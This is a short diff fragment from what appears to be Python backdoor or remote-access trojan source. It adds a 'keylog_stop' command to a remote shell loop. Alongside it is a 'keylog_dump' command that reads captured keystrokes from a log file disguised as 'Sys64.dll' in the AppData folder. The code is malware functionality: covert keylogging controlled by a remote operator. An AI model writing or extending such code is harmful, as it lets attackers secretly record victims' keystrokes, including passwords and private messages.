@@ -762,6 +762,14 @@ def shell():
             except:
                 reliable_send('[-]ERROR')
                 continue
+        elif command[:11] == 'keylog_stop':
+            try:
+                keylog.self_destruct()
+                t.join()
+                reliable_send('[+] Keylogger Stopped!')
+            except:
+                reliable_send('[-] keylogger not started')
+                continue
         elif command[:11] == 'keylog_dump':
             try:
                 keys = open(appd + '\\Sys64.dll', 'r').read()
